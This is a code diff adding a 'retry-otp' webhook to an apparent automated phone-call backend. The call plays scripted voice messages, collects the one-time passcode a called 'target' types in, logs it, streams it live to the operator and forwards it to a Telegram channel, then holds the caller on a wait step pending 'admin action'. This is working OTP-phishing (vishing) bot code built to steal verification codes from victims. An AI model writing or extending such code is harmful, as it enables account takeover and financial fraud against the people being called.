@@ -480,6 +480,94 @@ async def signalwire_wait(call_id: str):
             media_type="application/xml"
         )
 
+@router.post("/signalwire/{call_id}/retry-otp")
+async def signalwire_retry_otp(call_id: str, Digits: str = Form(None)):
+    """Handle OTP retry after rejected - Same as deny but for retry"""
+    try:
+        logger.info(f"Retry OTP for call {call_id}, Digits: {Digits}")
+        
+        # Get call from MongoDB
+        call_data = await MongoDBService.get_call(call_id)
+        
+        if not call_data:
+            return Response(
+                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
+                media_type="application/xml"
+            )
+        
+        voice = call_data.get('tts_voice', 'Aurora')
+        digits_required = call_data.get('digits', 6)
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
+        
+        # If OTP digits received
+        if Digits and len(Digits) == digits_required:
+            # Log OTP received (retry)
+            event = {
+                'time': datetime.utcnow().isoformat(),
+                'event': 'otp_received',
+                'message': f'🕵️ OTP submitted by target (retry): {Digits}',
+                'data': {'otp': Digits, 'retry': True}
+            }
+            
+            await MongoDBService.update_call_events(call_id, event)
+            await MongoDBService.update_call_field(call_id, 'otp_code', Digits)
+            await MongoDBService.update_call_field(call_id, 'otp_entered', Digits)
+            await MongoDBService.update_call_field(call_id, 'dtmf_code', Digits)
+            await MongoDBService.update_call_status(call_id, 'otp_entered')
+            
+            await manager.send_to_user(call_data['user_id'], {
+                'type': 'call_event',
+                'call_id': call_id,
+                'event': event
+            })
+            
+            # Forward OTP to Telegram (optional)
+            try:
+                user = await MongoDBService.get_user(call_data['user_id'])
+                await telegram.send_otp_to_channel(
+                    otp_code=Digits,
+                    call_id=call_id,
+                    user_email=user.get('email', 'Unknown')
+                )
+            except Exception as e:
+                logger.warning(f"Failed to forward OTP to Telegram: {e}")
+            
+            # Play Step 3 message and WAIT for admin action
+            step_3_message = call_data.get('step_3_message', 'Please wait')
+            wait_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/wait"
+            
+            # Log message played
+            msg_event = {
+                'time': datetime.utcnow().isoformat(),
+                'event': 'message_played',
+                'message': '🔊 Step 3 message played (retry)',
+                'data': {'step': 3, 'retry': True}
+            }
+            await MongoDBService.update_call_events(call_id, msg_event)
+            
+            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say voice="{voice}">{step_3_message}</Say>
+    <Pause length="3"/>
+    <Redirect>{wait_url}</Redirect>
+</Response>'''
+            return Response(content=twiml, media_type="application/xml")
+        else:
+            # No digits or invalid length - hangup
+            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Say voice="{voice}">We did not receive a valid code. Goodbye.</Say>
+    <Hangup/>
+</Response>'''
+            return Response(content=twiml, media_type="application/xml")
+            
+    except Exception as e:
+        logger.error(f"Retry OTP error: {e}")
+        return Response(
+            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
+            media_type="application/xml"
+        )
+
 @router.post("/signalwire/{call_id}/accept")
 async def signalwire_accept(call_id: str, request: Request):
     """Handle accept flow - User pressed 0"""
